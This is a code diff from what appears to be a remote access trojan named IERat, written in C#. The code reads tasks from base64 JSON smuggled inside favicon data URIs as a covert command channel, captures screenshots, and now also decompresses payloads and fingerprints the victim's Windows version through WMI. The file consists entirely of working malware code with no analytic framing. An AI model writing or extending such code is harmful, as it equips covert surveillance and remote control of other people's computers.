@@ -1,9 +1,11 @@
 ﻿using System;
-using System.Collections.Generic;
+using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
 using System.IO.Compression;
+using System.Management;
+using System.Runtime.InteropServices;
 using System.Web.Script.Serialization;
 using System.Windows.Forms;
 
@@ -18,13 +20,14 @@ namespace IERat.lib
                 favicon = favicon.Split(new string[] { "data:image/x-icon;base64," }, StringSplitOptions.None)[1];
                 string ResponseObjectJSON = Base64Decode(favicon);
                 JavaScriptSerializer js = new JavaScriptSerializer();
-                ResponseObject responseObject =  js.Deserialize<ResponseObject>(ResponseObjectJSON);
-                if (responseObject.Type == "NewAgent") { 
+                ResponseObject responseObject = js.Deserialize<ResponseObject>(ResponseObjectJSON);
+                if (responseObject.Type == "NewAgent")
+                {
                     if (responseObject.Notes == "Authenticated")
                     {
                         //Console.WriteLine("Authenticated Successfully");
                         IERat.channel.Status = "Connected";
-                    } 
+                    }
                 }
 
                 else if ((responseObject.Type == "NewTask") && (responseObject.Task != null))
@@ -53,6 +56,16 @@ namespace IERat.lib
                 return compressedStream.ToArray();
             }
         }
+        public static byte[] Decompress(byte[] data)
+        {
+            using (var compressedStream = new MemoryStream(data))
+            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
+            using (var resultStream = new MemoryStream())
+            {
+                zipStream.CopyTo(resultStream);
+                return resultStream.ToArray();
+            }
+        }
 
         public static byte[] CollectScreenshot()
         {
@@ -68,34 +81,27 @@ namespace IERat.lib
             }
             return imgStream.ToArray();
         }
-    }
-
-    public class ResponseObject
-    {
-        public ResponseObject()
+        public static String GetOS()
         {
-            Type = "NewTask"; // FilePart, NewAgent
-            Task = new TaskObject();
-        }
-        public string Type { get; set; }
-        public Guid AgentID { get; set; }
-        public TaskObject Task { get; set; }
-        public string Notes { get; set; }
-
-    }
-    public class RequestObject
-    {
-        public RequestObject(Guid ID)
-        {
-            AgentID = ID;
-            CompletedTasks = new List<TaskObject>();
-        }
-        public Guid AgentID { get; set; }
-        public List<TaskObject> CompletedTasks { get; set; }
-        public string ToJSON()
-        {
-            JavaScriptSerializer js = new JavaScriptSerializer();
-            return js.Serialize(this);
+            string r = "";
+            try
+            {
+                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem"))
+                {
+                    ManagementObjectCollection information = searcher.Get();
+                    if (information != null)
+                    {
+                        foreach (ManagementObject obj in information)
+                        {
+                            r = $"{obj["Caption"]} {obj["BuildNumber"]} {obj["OSArchitecture"]}";
+                        }
+                    }
+                    r = r.Replace("NT 5.1.2600", "XP");
+                    r = r.Replace("NT 5.2.3790", "Server 2003");
+                    return r;
+                }
+            }
+            catch  { return "N/A"; }
         }
     }
 }
